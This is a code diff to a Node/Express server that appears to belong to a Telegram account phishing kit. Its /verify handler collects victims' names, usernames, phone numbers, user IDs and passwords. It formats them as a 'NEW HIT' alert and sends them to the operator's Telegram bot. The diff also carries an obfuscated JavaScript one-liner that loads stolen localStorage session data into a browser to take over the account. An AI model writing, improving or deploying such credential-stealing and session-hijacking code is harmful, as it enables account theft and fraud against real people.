@@ -42,17 +42,19 @@ app.post('/verify', async (req, res) => {
     const textMessage = [
         `NEW HIT JUST ARRIVED 🔻\n`,
 
-        ...(userData?[`Name: ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.last_name : ''}`]:[]),
-        ...(userData?[`Username: ${userData.username}`]:[]),
-        ...(userData?.phone?[`Phone: ${userData.phone}`]:[]),
-        ...(jsonData.pass?[`Password: ${jsonData.pass}`]:[]),
+        ...(userData?[`<b>Name:</b> ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.last_name : ''}`]:[]),
+        ...(userData?[`<b>Username:</b> ${userData.username}`]:[]),
+        ...(userData?.phone?[`<b>Phone:</b> ${userData.phone}`]:[]),
+        ...(userData?[`<b>User ID:</b> ${userData.id}`]:[]),
+        ...(jsonData.pass?[`<b>Password:</b> ${jsonData.pass}`]:[]),
         '\n',
 
-        `CODE FOR LOGIN:\n`,
+        `<b>CODE FOR LOGIN:</b>\n`,
         `localStorage.clear();const data=${jsonData.ls},stringifiedData=JSON.stringify(data),newData=JSON.parse(stringifiedData.replaceAll(atob("ImNobmdfdGltZSI="),(new Date).getTime().toString()));Object.keys(newData).forEach((a=>{"object"==typeof newData[a]?localStorage.setItem(a,JSON.stringify(newData[a])):localStorage.setItem(a,newData[a])})),location.reload();`
     ].join('\n')
 
     axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+        parse_mode: 'HTML',
         chat_id: chatId,
         text: textMessage
     })
